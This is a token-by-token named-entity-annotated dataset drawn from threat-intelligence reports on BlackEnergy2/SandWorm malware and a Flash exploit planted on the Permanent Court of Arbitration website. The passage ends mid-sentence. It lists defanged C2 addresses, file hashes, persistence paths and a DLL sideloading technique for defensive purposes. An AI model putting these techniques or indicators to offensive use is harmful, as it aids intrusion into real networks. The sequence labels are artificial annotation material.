After	O
pulling	O
multiple	O
config	O
files	O
,	O
we	O
confirmed	O
that	O
this	O
ARM	O
object	O
inclusion	O
was	O
not	O
a	O
one	O
-	O
off	O
mistake	O
.	O
The	O
server	O
definitely	O
delivered	O
config	O
files	O
not	O
only	O
for	O
Windows	O
,	O
but	O
also	O
for	O
the	O
ARM	O
/	O
MIPS	O
platform	O
.	O
Though	O
unusual	O
,	O
the	B-Entity
ARM	I-Entity
module	I-Entity
was	O
delivered	O
by	O
the	B-Entity
same	I-Entity
server	I-Entity
and	O
it	O
processed	O
the	O
same	O
config	O
file	O
.	O
Over	O
time	O
we	O
were	O
able	O
to	O
collect	O
several	O
plugins	O
as	O
well	O
as	O
the	O
main	O
module	O
for	O
ARM	O
and	O
MIPS	O
architectures	O
.	O
All	O
of	O
these	O
ARM	O
/	O
MIPS	O
object	O
files	O
were	O
compiled	O
from	O
the	O
same	O
source	O
and	O
later	O
pushed	O
out	O
in	O
one	O
config	O
:	O
"	O
weap_msl	O
"	O
,	O
"	O
weap_mps	O
"	O
,	O
"	O
nm_hwi	O
"	O
,	O
"	O
nm_mps	O
"	O
,	O
"	O
weap_hwi	O
"	O
,	O
and	O
"	O
nm_msl	O
"	O
.	O
It	O
's	O
interesting	O
that	O
the	O
BE2	O
developers	O
upgraded	O
the	O
ddos	O
plugin	O
to	O
version	O
2	O
,	O
along	O
with	O
the	O
nm_hwi	O
,	O
nm_mps	O
,	O
and	O
nm_msl	O
plugins	O
.	O
They	O
simultaneously	O
released	O
version	O
5	O
of	O
the	O
weap_msl	O
,	O
weap_mps	O
,	O
and	O
weap_hmi	O
plugins	O
.	O
Those	O
assignments	O
were	O
not	O
likely	O
arbitrary	O
,	O
as	O
this	O
group	O
had	O
developed	O
BlackEnergy2	O
for	O
several	O
years	O
in	O
a	O
professional	O
and	O
organized	O
style	O
.	O
Here	O
is	O
the	O
list	O
of	O
retrieved	O
files	O
and	O
related	O
functionality	O
:	O
The	O
developers	O
'	O
coding	O
style	O
differed	O
across	O
the	O
'	O
Hook	O
'	O
main	O
module	O
,	O
the	O
plugins	O
,	O
and	O
the	O
Windows	O
main.dll	O
.	O
The	O
hook	O
main	O
module	O
contained	O
encrypted	O
strings	O
and	O
handled	O
all	O
the	O
function	O
calls	O
and	O
strings	O
as	O
the	O
references	O
in	O
a	O
large	O
structure	O
.	O
This	O
structure	O
obfuscation	O
may	O
be	O
a	O
rewrite	O
effort	O
to	O
better	O
modularize	O
the	O
code	O
,	O
but	O
could	O
also	O
be	O
intended	O
to	O
complicate	O
analysis	O
.	O
Regardless	O
,	O
it	O
is	O
likely	O
that	O
different	O
individuals	O
coded	O
the	O
different	O
plugins	O
.	O
So	O
,	O
the	O
BE2	O
effort	O
must	O
have	O
its	O
own	O
small	O
team	O
of	O
plugin	O
and	O
multiplatform	O
developers	O
.	O
After	O
decrypting	O
the	O
strings	O
,	O
it	O
became	O
clear	O
that	O
the	O
Linux	B-Entity
Hook	I-Entity
main	I-Entity
module	I-Entity
communicated	B-Action
with	O
the	O
same	B-Entity
CnC	I-Entity
server	I-Entity
as	O
other	O
Windows	O
modules	O
.	O
This	O
Linux	O
module	O
can	O
process	O
the	O
following	O
commands	O
,	O
some	O
of	O
which	O
are	O
similar	O
to	O
the	O
Windows	O
version	O
.	O
After	O
the	O
disclosure	O
of	O
an	O
unusual	O
CnC	O
server	O
that	O
pushed	O
Linux	O
and	O
the	O
new	O
Windows	O
plugins	O
we	O
paid	O
greater	O
attention	O
to	O
new	O
BE2	O
samples	O
and	O
associated	O
CnCs	O
.	O
During	O
an	O
extended	O
period	O
,	O
we	O
were	O
able	O
to	O
collect	O
many	O
Windows	O
plugins	O
from	O
different	O
CnC	O
servers	O
,	O
without	O
ever	O
noticing	O
Linux	O
plugins	O
being	O
downloaded	O
as	O
described	O
above	O
.	O
It	O
appears	O
the	O
BE2/SandWorm	O
gang	O
protected	O
their	O
servers	O
by	O
keeping	O
their	O
non	O
-	O
Windows	O
hacker	O
tools	O
and	O
plugins	O
in	O
separate	O
servers	O
or	O
server	O
folders	O
.	O
Finally	O
,	O
each	O
CnC	O
server	O
hosts	O
a	O
different	O
set	O
of	O
plugins	O
,	O
meaning	O
that	O
each	O
server	O
works	O
with	O
different	O
victims	O
and	O
uses	O
plugins	O
based	O
on	O
its	O
current	O
needs	O
.	O
Here	O
is	O
the	O
summary	O
list	O
of	O
all	O
known	O
plugins	O
at	O
the	O
moment	O
.	O
We	O
are	O
pretty	O
sure	O
that	O
our	O
list	O
of	O
BE2	O
tools	O
is	O
not	O
complete	O
.	O
For	O
example	O
,	O
we	O
have	O
yet	O
to	O
obtain	O
the	O
router	O
access	O
plugin	O
,	O
but	O
we	O
are	O
confident	O
that	O
it	O
exists	O
.	O
Evidence	O
also	O
supports	O
the	O
hypothesis	O
that	O
there	O
is	O
a	O
decryption	O
plugin	O
for	O
victim	O
files	O
(	O
see	O
below	O
)	O
.	O
Our	O
current	O
collection	O
represents	O
the	O
BE2	O
attackers	O
'	O
capabilities	O
quite	O
well	O
.	O
Some	O
plugins	O
remain	O
mysterious	O
and	O
their	O
purpose	O
is	O
not	O
yet	O
clear	O
,	O
like	O
'	O
usb	O
'	O
and	O
'	O
bios	O
'	O
.	O
Why	O
would	O
the	O
attackers	O
need	O
information	O
on	O
usb	O
and	O
bios	O
characteristics	O
?	O
It	O
suggests	O
that	O
based	O
on	O
a	O
specific	O
USB	O
and	O
BIOS	O
devices	O
,	O
the	B-Entity
attackers	I-Entity
may	O
upload	B-Action
specific	I-Action
plugins	O
to	O
carry	O
out	O
additional	O
actions	O
.	O
Perhaps	O
destructive	O
,	O
perhaps	O
to	O
further	O
infect	O
devices	O
.	O
We	O
do	O
n't	O
know	O
yet	O
.	O
It	O
's	O
also	O
interesting	O
to	O
point	O
out	O
another	O
plugin	O
–	O
'	O
grc	O
'	O
.	O
In	O
some	O
of	O
the	O
BE2	O
configuration	O
files	O
,	O
we	O
can	O
notice	O
an	O
value	O
with	O
a	O
"	O
gid	O
"	O
type	O
.	O
This	O
number	O
is	O
an	O
ID	O
for	O
the	O
plus.google.com	O
service	O
and	O
is	O
used	O
by	O
the	O
'	O
grc	O
'	O
plugin	O
to	O
parse	O
html	O
.	O
It	B-Entity
then	O
downloads	B-Action
and	O
decrypts	O
a	O
PNG	O
file	O
.	O
The	O
decrypted	O
PNG	O
is	O
supposed	O
to	O
contain	O
a	O
new	O
CNC	O
address	O
,	O
but	O
we	O
never	O
observed	O
one	O
.	O
We	O
are	O
aware	O
of	O
two	O
related	O
GooglePlus	O
IDs	O
.	O
The	O
first	O
one	O
,	O
plus.google.com/115125387226417117030/	O
,	O
contains	O
an	O
abnormal	O
number	O
of	O
views	O
.	O
At	O
the	O
time	O
of	O
writing	O
,	O
the	O
count	O
is	O
75	O
million	O
.	O
The	O
second	O
one	O
-	O
plus.google.com/116769597454024178039/posts	O
-	O
is	O
currently	O
more	O
modest	O
at	O
a	O
little	O
over	O
5,000	O
views	O
.	O
All	O
of	O
that	O
account	O
's	O
posts	O
are	O
deleted	O
.	O
During	O
observation	O
of	O
the	O
described	O
above	O
"	O
router	O
-	O
PC	O
"	O
CnC	O
we	O
tracked	O
the	O
following	O
commands	O
delivered	O
in	O
the	O
config	O
file	O
before	O
the	O
server	O
went	O
offline	O
.	O
Our	O
observation	O
of	O
related	O
actions	O
here	O
.	O
The	O
issued	O
commands	O
for	O
the	O
Linux	O
plugins	O
suggest	O
the	B-Entity
attackers	I-Entity
controlled	O
infected	B-Action
MIPS	B-Entity
/	I-Entity
ARM	I-Entity
devices	I-Entity
.	O
We	O
want	O
to	O
pay	O
special	O
attention	O
to	O
the	O
DDoS	O
commands	O
meant	O
for	O
these	O
routers	O
.	O
188.128.123.52	O
belongs	O
to	O
the	O
Russian	O
Ministry	O
of	O
Defense	O
and	O
212.175.109.10	O
belongs	O
to	O
the	O
Turkish	O
Ministry	O
of	O
Interior	O
's	O
government	O
site	O
.	O
While	O
many	O
researchers	O
suspect	O
a	O
Russian	O
actor	O
is	O
behind	O
BE2	O
,	O
judging	O
by	O
their	O
tracked	O
activities	O
and	O
the	O
victim	O
profiles	O
,	O
it	O
's	O
still	O
unclear	O
whose	O
interests	O
they	O
represent	O
.	O
While	O
observing	O
some	O
other	O
CnCs	O
and	O
pulling	O
down	O
config	O
files	O
,	O
we	O
stumbled	O
upon	O
some	O
strange	O
mistakes	O
and	O
mis	O
-	O
typing	O
.	O
They	O
are	O
highlighted	O
in	O
the	O
image	O
below	O
.	O
First	O
,	O
these	O
mistakes	O
suggest	O
that	O
the	O
BE2	O
attackers	O
manually	O
edit	O
these	O
config	O
files	O
.	O
Secondly	O
,	O
it	O
shows	O
that	O
even	O
skilled	O
hackers	O
make	O
mistakes	O
.	O
The	O
contents	O
of	O
the	O
config	O
files	O
themselves	O
are	O
fairly	O
interesting	O
.	O
They	O
all	O
contain	O
a	O
callback	O
c2	O
with	O
a	O
hardcoded	O
ip	O
address	O
,	O
some	O
contain	O
timeouts	O
,	O
and	O
some	O
contain	O
the	O
commands	O
listed	O
above	O
.	O
We	O
include	O
a	O
list	O
of	O
observed	O
hardcoded	O
ip	O
C2	O
addresses	O
here	O
,	O
along	O
with	O
the	O
address	O
owner	O
and	O
geophysical	O
location	O
of	O
the	O
host	O
.	O
It	O
's	O
interesting	O
that	O
one	O
of	O
these	O
servers	O
is	O
a	O
Tor	O
exit	O
node	O
.	O
And	O
,	O
according	O
to	O
the	O
collected	O
config	O
files	O
,	O
the	O
group	O
upgraded	O
their	O
malware	O
communications	O
from	O
plain	O
text	O
http	O
to	O
encrypted	O
https	O
in	O
October	O
2013	O
.	O
BlackEnergy2	O
victims	O
are	O
widely	O
distributed	O
geographically	O
.	O
We	O
identified	O
BlackEnergy2	O
targets	O
and	O
victims	O
in	O
the	O
following	O
countries	O
starting	O
in	O
late	O
2013	O
.	O
There	O
are	O
likely	O
more	O
victims	O
.	O
Victim	O
profiles	O
point	O
to	O
an	O
expansive	O
interest	O
in	O
ICS	O
.	O
However	O
,	O
we	O
also	O
noticed	O
that	O
the	O
target	O
list	O
includes	O
government	O
,	O
property	O
holding	O
,	O
and	O
technology	O
organizations	O
as	O
well	O
.	O
We	O
gained	O
insight	O
into	O
significant	O
BE2	O
victim	O
profiles	O
over	O
the	O
summer	O
of	O
2014	O
.	O
Interesting	O
BE2	O
incidents	O
are	O
presented	O
here	O
.	O
The	O
BE2	B-Entity
attackers	I-Entity
successfully	O
spearphished	O
an	O
organization	O
with	O
an	O
exploit	O
for	O
which	O
there	O
is	O
no	O
current	O
CVE	O
,	O
and	O
a	O
metasploit	O
module	O
has	O
been	O
available	O
This	O
email	O
message	O
contained	O
a	O
ZIP	O
archive	O
with	O
EXE	O
file	O
inside	O
that	O
did	O
not	O
appear	O
to	O
be	O
an	O
executable	O
.	O
This	O
crafted	O
zip	O
archive	O
exploited	O
a	O
WinRAR	O
flaw	O
that	O
makes	O
files	O
in	O
zip	O
archives	O
appear	O
to	O
have	O
a	O
different	O
name	O
and	O
file	O
extension	O
.	O
The	O
attached	O
exe	O
file	O
turned	O
out	O
to	O
be	O
'	O
BlackEnergy	O
-	O
like	O
'	O
malware	O
,	O
which	O
researchers	O
already	O
dubbed	O
'	O
BlackEnergy3	O
'	O
-	O
the	O
gang	O
uses	O
it	O
along	O
with	O
BlackEnergy2	O
.	O
Kaspersky	O
Lab	O
detects	O
'	O
BlackEnergy3	O
'	O
malware	O
as	O
Backdoor	O
.	O
Win32.Fonten	O
–	O
naming	O
it	O
after	O
its	O
dropped	O
file	O
"	O
FONTCACHE.DAT	O
"	O
When	O
investigating	O
computers	O
in	O
the	O
company	O
's	O
network	O
,	O
only	O
BE2	O
associated	O
files	O
were	O
found	O
,	O
suggesting	O
BE3	O
was	O
used	O
as	O
only	O
a	O
first	O
-	O
stage	O
tool	O
on	O
this	O
network	O
.	O
The	O
config	O
files	O
within	O
BE2	O
contained	O
the	O
settings	O
of	O
the	O
company	O
's	O
internal	O
web	O
proxy	O
.	O
As	O
the	O
APT	O
-	O
specific	O
BE2	O
now	O
stores	O
the	O
downloaded	B-Entity
plugins	I-Entity
in	O
encrypted	O
files	O
on	O
the	O
system	O
(	O
not	O
seen	O
in	O
older	O
versions	O
–	O
all	O
plugins	O
were	O
only	O
in	O
-	O
memory	O
)	O
,	O
the	O
administrators	O
were	O
able	O
to	O
collect	O
BE2	O
files	O
from	O
the	O
infected	O
machines	O
.	O
After	O
decrypting	O
these	O
files	O
,	O
we	O
could	O
retrieve	O
plugins	O
launched	O
on	O
infected	O
machines	O
:	O
ps	O
,	O
vsnet	O
,	O
fs	O
,	O
ss	O
,	O
dstr	O
.	O
By	O
all	O
appearances	O
,	O
the	B-Entity
attackers	I-Entity
pushed	O
the	O
'	B-Entity
dstr	I-Entity
'	I-Entity
module	I-Entity
when	O
they	O
understood	O
that	O
they	O
were	O
revealed	O
,	O
and	O
wanted	O
to	O
hide	O
their	O
presence	O
on	O
the	O
machines	O
.	O
Some	O
machines	O
already	O
launched	O
the	O
plugin	O
,	O
lost	O
their	O
data	O
and	O
became	O
unbootable	O
.	O
Also	O
,	O
on	O
some	O
machines	O
,	O
documents	O
were	O
encrypted	O
,	O
but	O
no	O
related	O
plugin	O
could	O
be	O
found	O
.	O
The	O
second	O
organization	O
was	O
hacked	O
via	O
the	O
first	O
victim	O
's	O
stolen	O
VPN	O
credentials	O
.	O
After	O
the	O
second	O
organization	O
was	O
notified	O
about	O
the	O
infection	O
they	O
started	O
an	O
internal	O
investigation	O
.	O
They	O
confirmed	O
that	O
some	O
data	O
was	O
destroyed	O
on	O
their	O
machines	O
,	O
so	O
the	O
BE2	O
attackers	O
have	O
exhibited	O
some	O
level	O
of	O
destructive	O
activity	O
.	O
And	O
,	O
they	O
revealed	O
that	O
their	B-Entity
Cisco	I-Entity
routers	I-Entity
with	I-Entity
different	I-Entity
IOS	I-Entity
versions	I-Entity
were	O
hacked	O
.	O
They	O
were	O
n't	O
able	O
to	O
connect	O
to	O
the	O
routers	O
any	O
more	O
by	O
telnet	O
and	O
found	O
the	O
following	O
"	O
farewell	O
"	O
tcl	O
scripts	O
in	O
the	O
router	O
's	O
file	O
system	O
.	O
Ciscoapi.tcl	O
–	O
contains	O
various	O
wrappers	O
over	O
cisco	O
EXEC	O
-	O
commands	O
as	O
described	O
in	O
the	O
comments	O
.	O
The	O
comment	O
includes	O
a	O
punchy	O
message	O
for	O
"	O
kasperRsky	O
"	O
.	O
Killint.tcl	O
–	O
uses	O
Ciscoapi.tcl	O
,	O
implements	O
destroying	O
functions	O
.	O
The	O
script	O
tries	O
to	O
download	B-Action
ciscoapi.tcl	B-Entity
from	B-Modifier
a	O
certain	B-Entity
FTP	I-Entity
server	I-Entity
which	O
served	O
as	O
a	O
storage	O
for	O
BE2	O
files	O
.	O
The	O
organization	O
managed	O
to	O
discover	O
what	O
scripts	O
were	O
hosted	O
on	O
the	O
server	O
before	O
BE	O
/	O
SandWorm	O
gang	O
deleted	O
them	O
,	O
and	O
unfortunately	O
could	O
n't	O
restore	O
them	O
after	O
they	O
were	O
deleted	O
.	O
The	O
BE2	O
actor	O
performs	O
careful	O
,	O
professional	O
activity	O
covering	O
their	O
tracks	O
.	O
There	O
is	O
evidence	O
that	O
the	O
logs	O
produced	O
by	O
some	O
scripts	O
were	O
also	O
stored	O
on	O
the	O
FTP	O
server	O
,	O
in	O
particular	O
the	O
information	O
on	O
CDP	O
neighbors	O
which	O
is	O
provided	O
by	O
one	O
of	O
the	O
procedures	O
of	O
ciscoapi.tcl	O
.	O
The	O
third	O
organization	O
got	O
compromised	O
by	O
the	O
same	O
type	O
of	O
attack	O
as	O
the	O
first	O
one	O
(	O
an	O
EXE	O
file	O
spoofing	O
a	O
doc	O
within	O
a	O
Zip	O
archive	O
)	O
.	O
All	O
the	O
plugins	O
discovered	O
in	O
BE2	O
files	O
were	O
known	O
,	O
and	O
there	O
was	O
no	O
revelation	O
of	O
hacked	O
network	O
devices	O
on	O
their	O
side	O
and	O
no	O
destroyed	O
data	O
.	O
The	O
noticeable	O
thing	O
is	O
that	O
many	O
computers	O
contained	O
both	O
BE2	O
and	O
BE3	O
files	O
and	O
some	O
config	O
files	O
contained	O
the	O
following	O
URL	O
.	O
hxxps://46.165.222(dot)28/upgrade	O
/	O
f3395cd54cf857ddf8f2056768ff49ae	O
/	O
getcfg.php	O
The	O
URL	O
contains	O
the	O
md5	O
of	O
the	O
string	O
'	O
router	O
'	O
.	O
One	O
of	O
the	O
discovered	O
config	O
files	O
contained	O
a	O
URL	O
with	O
an	O
as	O
yet	O
unidentified	O
md5	O
.	O
hxxps://46.165.222(dot)28/upgrade	O
/	O
bf0dac805798cc1f633f19ce8ed6382f	O
/	O
upgrade.php	O
A	O
set	O
of	O
victims	O
discovered	O
installed	O
Siemens	O
SCADA	O
software	O
in	O
their	O
ICS	O
environment	O
was	O
responsible	O
for	O
downloading	B-Action
and	O
executing	O
BlackEnergy	O
.	O
Starting	O
in	O
March	O
2014	O
and	O
ending	O
in	O
July	O
2014	O
,	O
Siemens	B-Entity
"	I-Entity
ccprojectmgr.exe	I-Entity
"	I-Entity
downloaded	B-Action
and	O
executed	B-Action
a	B-Entity
handful	I-Entity
of	I-Entity
different	I-Entity
payloads	I-Entity
hosted	O
at	O
94.185.85.122/favicon.ico	O
.	O
They	O
are	O
all	O
detected	O
as	O
variants	O
of	O
"	O
Backdoor	O
.	O
Win32.Blakken	O
"	O
.	O
Each	O
config	O
file	O
within	O
BE2	O
main.dll	O
has	O
a	O
field	O
called	O
build_id	O
which	O
identifies	O
the	O
malware	O
version	O
for	O
the	O
operators	O
.	O
Currently	O
this	O
particular	O
BE	O
/	O
SandWorm	O
gang	O
uses	O
a	O
certain	O
pattern	O
for	O
the	O
build	O
ids	O
containing	O
three	O
hex	O
numbers	O
and	O
three	O
letters	O
,	O
as	O
follows	O
.	O
0C0703hji	O
The	O
numbers	O
indicate	O
the	O
date	O
of	O
file	O
creation	O
in	O
the	O
format	O
:	O
Year	O
-	O
Month	O
-	O
Day	O
.	O
Still	O
,	O
the	O
purpose	O
of	O
the	O
letters	O
is	O
unknown	O
,	O
but	O
most	O
likely	O
it	O
indicates	O
the	O
targets	O
.	O
The	O
hex	O
numbers	O
were	O
n't	O
used	O
all	O
the	O
time	O
,	O
sometimes	O
we	O
observed	O
decimal	O
numbers	O
.	O
100914_mg	O
100929nrT	O
Most	O
interesting	O
for	O
us	O
was	O
the	O
earliest	O
build	O
i	O
d	O
we	O
could	O
find	O
.	O
Currently	O
it	O
is	O
"	O
OB020Ad0V	O
"	O
,	O
meaning	O
that	O
the	O
BE2/SandWorm	O
APT	O
started	O
operating	O
as	O
early	O
as	O
the	O
beginning	O
of	O
2010	O
.	O
While	O
BE	B-Entity
dropper	I-Entity
installs	B-Action
its	O
driver	O
under	O
a	O
randomly	O
picked	O
non	O
-	O
used	O
Windows	O
driver	O
name	O
,	O
like	O
%	O
system32%\drivers\AliIde.sys	O
.	O
The	O
driver	O
is	O
self	O
-	O
signed	O
on	O
64-bit	O
systems	O
However	O
,	O
new	O
"	O
APT	O
"	O
BE2	O
uses	O
one	O
of	O
the	O
following	O
filenames	O
that	O
are	O
used	O
as	O
an	O
encrypted	O
storage	O
for	O
plugins	O
and	O
the	O
network	O
settings	O
.	O
They	O
are	O
consistent	O
and	O
serve	O
as	O
stable	O
IoC.	O
BE2	O
also	O
uses	O
start	B-Action
menu	B-Entity
locations	I-Entity
for	B-Modifier
persistence	B-Entity
.	O
Users\user\AppData\Roaming\Microsoft\Windows\Start	O
Menu\Programs\Startup\flashplayerapp.exe	O
BE3	O
uses	O
the	O
following	O
known	O
filenames	O
.	O
%	O
USERPROFILE%\NTUSER.LOG	O
%	O
LOCALAPPDATA%\FONTCACHE.DAT	O
BE2	O
MD5s	O
.	O
BE3	O
MD5s	O
.	O
In	O
early	O
July	O
2015	O
,	O
Chinese	O
APT	O
actors	O
used	O
an	O
Adobe	O
Flash	O
Player	O
exploit	O
within	O
a	O
specific	O
webpage	O
detailing	O
a	O
noteworthy	O
international	O
legal	O
case	O
between	O
the	O
Philippines	O
and	O
China	O
.	O
This	O
precedent	O
setting	O
legal	O
case	O
would	O
be	O
followed	O
by	O
many	O
Southeast	O
Asian	O
nations	O
,	O
as	O
well	O
as	O
others	O
around	O
the	O
globe	O
.	O
The	O
exploit	O
appeared	O
on	O
day	O
three	O
of	O
the	O
Permanent	O
Court	O
of	O
Arbitration	O
tribunal	O
,	O
exposing	O
an	O
untold	O
number	O
of	O
interested	O
parties	O
that	O
visited	O
the	O
webpage	O
to	O
potential	O
exploitation	O
.	O
When	O
considered	O
holistically	O
,	O
the	O
intelligence	O
supports	O
the	O
conclusion	O
that	O
this	O
exploitation	O
campaign	O
was	O
purposefully	O
carried	O
out	O
against	O
the	O
backdrop	O
of	O
diplomatic	O
and	O
legal	O
maneuvering	O
.	O
Despite	O
Beijing	O
's	O
unwillingness	O
to	O
participate	O
in	O
the	O
international	O
arbitration	O
and	O
their	O
rejection	O
of	O
the	O
PCA	O
's	O
jurisdiction	O
,	O
there	O
appears	O
to	O
be	O
a	O
distinct	O
effort	O
to	O
surreptitiously	O
target	O
those	O
who	O
are	O
interested	O
in	O
this	O
landmark	O
international	O
legal	O
case	O
via	O
electronic	O
means	O
.	O
ThreatConnect	O
has	O
shared	O
the	O
details	O
of	O
this	O
incident	O
to	O
our	O
Common	O
Community	O
within	O
Incident	O
20150710D	O
:	O
Permanent	O
Court	O
of	O
Arbitration	O
Flash	O
Exploit	O
.	O
Log	O
into	O
your	O
ThreatConnect	O
account	O
or	O
register	O
for	O
one	O
via	O
our	O
Community	O
Editions	O
and	O
access	O
the	O
most	O
comprehensive	O
and	O
widely	O
adopted	O
Threat	O
Intelligence	O
Platform	O
on	O
the	O
market	O
.	O
Since	O
the	O
revelation	O
of	O
an	O
Adobe	O
Flash	O
Player	O
zero	O
day	O
exploit	O
exposed	O
as	O
part	O
of	O
the	O
leaked	O
"	O
Hacking	O
Team	O
"	O
arsenal	O
on	O
July	O
6th	O
2015	O
(	O
designated	O
CVE-2015	O
-	O
5119	O
)	O
,	O
the	O
ThreatConnect	O
Intelligence	O
Research	O
Team	O
has	O
been	O
monitoring	O
its	O
adoption	O
by	O
other	O
malicious	O
actors	O
that	O
are	O
not	O
tied	O
to	O
"	O
Hacking	O
Team	O
"	O
.	O
On	O
Thursday	O
,	O
July	O
9	O
,	O
2015	O
ThreatConnect	O
observed	O
that	O
a	O
CVE-2015	O
-	O
5119	O
exploit	O
was	O
embedded	O
strategically	O
within	O
the	O
website	O
for	O
the	O
Permanent	O
Court	O
of	O
Arbitration	O
(	O
PCA	O
)	O
,	O
72	O
hours	O
after	O
the	O
exploit	O
was	O
disclosed	O
publicly	O
.	O
The	O
significance	O
of	O
this	O
is	O
that	O
the	O
PCA	O
is	O
an	O
"	O
intergovernmental	O
organization	O
providing	O
a	O
variety	O
of	O
dispute	O
resolution	O
services	O
to	O
the	O
international	O
community	O
"	O
located	O
at	O
the	O
"	O
Peace	O
Palace	O
"	O
within	O
The	O
Hague	O
,	O
Netherlands	O
.	O
The	O
102-year	O
-	O
old	O
Peace	O
Palace	O
is	O
a	O
historic	O
fixture	O
within	O
the	O
sphere	O
of	O
international	O
law	O
because	O
it	O
also	O
houses	O
the	O
International	O
Court	O
of	O
Justice	O
,	O
the	O
principal	O
judicial	O
body	O
of	O
the	O
United	O
Nations	O
,	O
as	O
well	O
as	O
other	O
bodies	O
and	O
resources	O
that	O
uphold	O
and	O
support	O
international	O
laws	O
and	O
norms	O
to	O
which	O
many	O
nations	O
adhere	O
.	O
The	O
exploit	O
was	O
posted	O
to	O
the	O
PCA	O
website	O
during	O
the	O
first	O
round	O
of	O
arguments	O
of	O
a	O
notable	O
international	O
legal	O
case	O
where	O
the	O
Philippines	O
is	O
contesting	O
Chinese	O
territorial	O
expansion	O
within	O
the	O
South	O
China	O
Sea	O
(	O
SCS	O
)	O
,	O
specifically	O
challenging	O
encroachment	O
into	O
the	O
Philippines	O
exclusive	O
economic	O
zone	O
(	O
EEZ	O
)	O
.	O
These	O
arbitral	O
proceedings	O
were	O
initially	O
instituted	O
by	O
the	O
Republic	O
of	O
the	O
Philippines	O
against	O
the	O
People	O
's	O
Republic	O
of	O
China	O
under	O
Annex	O
VII	O
of	O
the	O
United	O
Nations	O
Convention	O
on	O
the	O
Law	O
of	O
the	O
Sea	O
(	O
UNCLOS	O
)	O
on	O
January	O
22	O
,	O
2013	O
.	O
Two	O
years	O
later	O
,	O
on	O
July	O
09	O
,	O
2015	O
,	O
an	O
attacker	O
compromised	O
the	O
official	O
PCA	O
webpages	O
at	O
.	O
This	O
exploitation	O
was	O
almost	O
certainly	O
not	O
a	O
random	O
compromise	O
of	O
the	O
PCA	O
website	O
;	O
rather	O
,	O
it	O
occurred	O
during	O
the	O
initial	O
phase	O
of	O
the	O
legal	O
proceedings	O
.	O
The	O
exploit	O
itself	O
was	O
embedded	O
within	O
the	O
very	O
pages	O
that	O
specifically	O
described	O
the	O
legal	O
case	O
of	O
The	O
Republic	O
of	O
the	O
Philippines	O
v.	O
The	O
People	O
's	O
Republic	O
of	O
China	O
.	O
According	O
to	O
URLQuery	O
,	O
the	O
attackers	O
placed	O
a	O
CVE-2015	O
-	O
5119	O
Flash	O
Exploit	O
at	O
the	O
malicious	O
URL	O
[	O
http:]//pic.nicklockluckydog[.]org	O
/	O
movie.swf	O
,	O
and	O
altered	O
the	O
PCA	O
webpages	O
to	O
load	O
that	O
URL	O
when	O
visited	O
.	O
The	O
domain	O
pic.nicklockluckydog[.]org	O
resolved	O
to	O
the	O
IP	O
address	O
192.243.116[.]241	O
(	O
Phoenix	O
,	O
Arizona	O
,	O
US	O
)	O
at	O
the	O
time	O
of	O
initial	O
exploitation	O
.	O
IP	O
Address	O
192.243.116[.]241	O
is	O
owned	O
by	O
IT7	O
Networks	O
,	O
Inc.	O
,	O
which	O
provides	O
self	O
-	O
managed	O
Virtual	O
Private	O
Server	O
(	O
VPS	O
)	O
infrastructure	O
.	O
The	O
attackers	O
shifted	O
the	O
domain	O
later	O
,	O
resolving	O
to	O
IP	O
Address	O
108.61.117[.]9	O
(	O
Haarlem	O
,	O
Netherlands	O
)	O
on	O
Friday	O
,	O
July	O
10th	O
,	O
the	O
very	O
day	O
that	O
the	O
tribunal	O
convened	O
in	O
The	O
Hague	O
.	O
The	O
malware	O
payload	O
associated	O
with	O
this	O
exploit	O
has	O
been	O
identified	O
as	O
MD5	O
:	O
B4522D05A9E3A034AF481A7797A445EA	O
(	O
Rdws.exe	O
)	O
.	O
This	O
payload	O
is	O
a	O
dropper	O
executable	O
that	O
deploys	O
its	O
main	O
malware	O
component	O
using	O
a	O
dynamic	O
link	O
library	O
(	O
DLL	O
)	O
sideloading	O
technique	O
,	O
where	O
a	O
malicious	O
DLL	O
is	O
dropped	O
alongside	O
a	O
legitimate	O
program	O
executable	O
that	O
will	O
load	O
that	O
malicious	O
DLL	O
by	O
filename	O
.	O
In	O
this	O
instance	O
,	O
the	O
attackers	O
leveraged	O
the	O
legitimate	O
Google	O
Chrome	O
Frame	O
Helper	O
executable	O
MD5	O
.	O
DFDC5B09C4DEA79EB7F5B9E4E76EECF9	O
(	O
LMS.exe	O
)	O
with	O
the	O
malicious	O
sideload	O
DLL	O
file	O
MD5	O
:	O
2EE25DE7BD6A2705F3F8DDE0DD681E96	O
(	O
dbghelp.dll	O
)	O
.	O
LMS.exe	O
will	O
load	O
any	O
DLL	B-Entity
file	I-Entity
name	I-Entity
dbghelp.dll	I-Entity
that	I-Entity
is	I-Entity
found	I-Entity
in	I-Entity
the	I-Entity
same	I-Entity
path	I-Entity
,	O
hence	O
the	O
sideloading	O
technique	O
.	O
In	O
turn	O
,	O
The	B-Entity
malicious	I-Entity
DLL	I-Entity
loads	I-Entity
a	B-Action
backdoor	B-Entity
binary	I-Entity
blob	I-Entity
MD5	I-Entity
:	O
16E5A27BD55E0B4E595C9743F4C75611	O
(	O
ticrf.rat	O
)	O
.	O
The	O
malware	O
connects	O
back	B-Action
to	B-Modifier
the	B-Entity
exploit	I-Entity
domain	I-Entity
pic.nicklockluckydog[.]org	O
as	O
well	O
as	O
the	B-Entity
subdomain	I-Entity
ssl.nicklockluckydog[.]org	I-Entity
.	O
The	O
domain	O
ssl.nicklockluckydog[.]org	O
resolved	O
to	O
175.45.233[.]205	O
(	O
Seoul	O
,	O
South	O
Korea	O
)	O
at	O
the	O
time	O
of	O
analysis	O
.	O
ThreatConnect	O
also	O
uncovered	O
a	O
related	O
malware	O
sample	O
MD5	O
:	O
5877D15215B7F398319F0DE7BA7B1947	O
,	O
which	O
was	O
submitted	O
to	O
Malwr.com	O
on	O
July	O
15	O
,	O
2015	O
.	O
This	O
malware	O
implant	O
matches	O
the	O
type	O
used	O
above	O
,	O
and	O
leverages	O
the	O
C2	O
domains	O
books.blueworldlink2015[.]net	O
and	O
vpn.nicklockluckydog[.]org	O
.	O
The	O
former	O
domain	O
resolves	O
to	O
the	O
same	O
Netherlands	O
IP	O
108.61.117[.]9	O
which	O
resolved	O
pic.nicklockluckydog[.]org	O
on	O
July	O
10th	O
.	O
blueworldlink2015[.]net	O
was	O
registered	O
by	O
the	O
email	O
address	O
nicklock2004[@]aol[.]com	O
,	O
which	O
noticeably	O
uses	O
the	O
same	O
"	O
nicklock	O
"	O
pseudonym	O
found	O
in	O
the	O
domain	O
nicklockluckydog[.]org	O
,	O
and	O
uses	O
the	O
falsified	O
address	O
info	O
"	O
zhongguohunansheng	O
"	O
Beijing	O
,	O
China	O
.	O
The	O
domain	O
nicklockluckydog[.]org	O
was	O
